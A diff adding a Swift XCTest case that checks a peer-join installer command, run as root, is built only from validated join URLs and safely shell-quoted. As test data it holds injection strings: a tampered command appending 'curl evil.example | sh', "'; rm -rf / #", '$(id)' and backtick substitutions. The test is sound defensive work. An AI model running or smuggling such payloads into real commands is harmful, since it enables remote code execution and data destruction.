@@ -11,6 +11,7 @@ final class PeersTests: XCTestCase {
         ("testPeerInviteRequestBody", testPeerInviteRequestBody),
         ("testDecodesPeersTolerantly", testDecodesPeersTolerantly),
         ("testPeerStates", testPeerStates),
+        ("testJoinCommandIsBuiltFromCheckedParts", testJoinCommandIsBuiltFromCheckedParts),
     ]
     static var asyncTests = [
         ("testCreatePeerInvite", testCreatePeerInvite),
@@ -119,5 +120,30 @@ final class PeersTests: XCTestCase {
             XCTFail("expected an error")
         } catch {}
         XCTAssertEqual(StubURLProtocol.recorded.count, 2)
+    }
+
+    /// Security finding 6: the server runs this command as root, so it's built only from a
+    /// join URL of the hub's shape, single-quoted as the hub's _sh_quote does.
+    func testJoinCommandIsBuiltFromCheckedParts() {
+        let join = "http://hub-a.example.ts.net:8765/join/nyi_AbCdEfGhIjKlMnOpQrStUvWxYz012345"
+        // Byte for byte what the hub's PEER_JOIN_COMMAND gives for this link and version.
+        let hubs = "(curl -fsSL https://github.com/tayharris/needs-you/releases/download/v0.3.0/install-hub.sh && echo 'http://hub-a.example.ts.net:8765/join/nyi_AbCdEfGhIjKlMnOpQrStUvWxYz012345') | sudo bash -s -- --join -"
+        XCTAssertEqual(PeerJoinCommand.command(joinURL: join, version: "0.3.0"), hubs)
+        XCTAssertEqual(PeerJoinCommand.resolve(joinURL: join, hubCommand: hubs, appVersion: "0.2.9"), hubs)
+        XCTAssertEqual(PeerJoinCommand.resolve(joinURL: join, hubCommand: nil, appVersion: "0.3.0"), hubs)
+        // A hub command that isn't exactly that one is replaced by the app's own.
+        let tampered = hubs.replacingOccurrences(of: "sudo bash", with: "sudo bash -x; curl evil.example | sh; bash")
+        XCTAssertEqual(PeerJoinCommand.resolve(joinURL: join, hubCommand: tampered, appVersion: "0.3.0"), hubs)
+        XCTAssertNil(PeerJoinCommand.resolve(joinURL: join, hubCommand: tampered, appVersion: "X.Y.Z"))
+        XCTAssertTrue(PeerJoinCommand.isJoinURL("https://[fd7a:115c:a1e0::1]:8765/hub/join/nyi_AbCdEfGhIjKlMnOpQrSt"))
+        for bad in [join + "'; rm -rf / #", join + "\n", "http://hub-a.example.ts.net:8765/join/nyi_$(id)xxxxxxxxxxxxxx",
+                    "http://hub-a.example.ts.net:8765/join/nyi_`id`xxxxxxxxxxxxxxx", "http://a b/join/nyi_AbCdEfGhIjKlMnOpQr",
+                    "file:///join/nyi_AbCdEfGhIjKlMnOpQrSt", "http://user@hub/join/nyi_AbCdEfGhIjKlMnOpQrSt",
+                    "http://hub/join/nyi_short", "http://hub/x?y=/join/nyi_AbCdEfGhIjKlMnOpQrSt", ""] {
+            XCTAssertFalse(PeerJoinCommand.isJoinURL(bad), bad)
+            XCTAssertNil(PeerJoinCommand.resolve(joinURL: bad, hubCommand: hubs, appVersion: "0.3.0"), bad)
+        }
+        XCTAssertNil(PeerJoinCommand.command(joinURL: join, version: "0.3.0; id"))
+        XCTAssertEqual(PeerJoinCommand.shellQuote("it's"), "'it'\"'\"'s'")
     }
 }
